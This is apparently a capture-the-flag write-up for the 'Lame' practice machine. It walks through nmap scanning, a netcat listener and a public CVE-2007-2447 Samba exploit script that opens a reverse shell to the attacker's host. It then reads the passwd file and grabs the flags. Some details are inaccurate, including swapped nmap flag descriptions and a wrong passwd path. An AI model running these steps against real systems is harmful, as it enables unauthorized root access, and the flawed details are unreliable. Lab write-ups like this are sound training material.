# Lame

## Recon
We're given the IP address of a machine that we don't know much about. Looking at the tags associated with this machine (Internal, Network, SAMBA, CVE-2007-2447), it's quite clear that this will be an easy exploit centered around samba 3.x

The first task is to look at the ports open on Lame. The command i used was nmap -sV -sC 10.10.10.3
```
-sV: run the default scripts
-sC: probe ports for the versions run on them
-Pn: treat host as online
```

After a few seconds, we see the following information of note:
```
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

```
FTP is open on port 21! We can log in as ftp, and anonymous login is allowed.

```
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```
Samba 3.0.20 is open on port 445. Quickly googling CVE-2007-2447 lets us know that this is *easily* exploitable to get remote code execution.


Honestly, at this point I went ahead and exploited this vulnerability right away without checking for other vulnerabilities.
*--------------------------------------------------------------------------------------------------------------------------------------------------------*

## Exploitation

After having a further look at this CVE online, I found that there was a tool that essentially automates the initialization of a remote shell using this version of Samba.

[Amriunix's CVE-2007-2447 On Github](https://github.com/amriunix/CVE-2007-2447)

I followed the instructions on the page cloning the repository and got it set up on my host machine. Looking at the usage instructions, we arm the tool in the following format: `python usermap_script.pt <RHOST> <RPORT> <LHOST> <LPORT>`. I set up Netcat to listen on port 9999: `nc -lnvp 9999` and prepared the CVE: `python usermap_script.py 10.10.10.3 445 10.10.14.8 9999`

Upon launching the command, I saw that I'd caught a shell on port 9999 in netcat. Upon typing *whoami* I found that i was root.

*--------------------------------------------------------------------------------------------------------------------------------------------------------*

## Remote Code Execution

The first thing i did was *accidentally* get the system own, and steal the root flag at /home/root. I submitted the flag and double checked that there was actually a user to own. 

There was.

I may have jumped the gun.

To determine who else could be a user on this machine, I entered `cat hosts/passwd`, and sure enough there's a name of interest at the bottom of our list.
```
makis:x:1003:1003::/home/makis:/bin/sh
```

Since we're already logged in as root, it's a simple as entering `su makis`, logging in as that user. After gaining access to Makis' account, I simply repeated the process for stealing the root flag found instead this time under /home/makis.
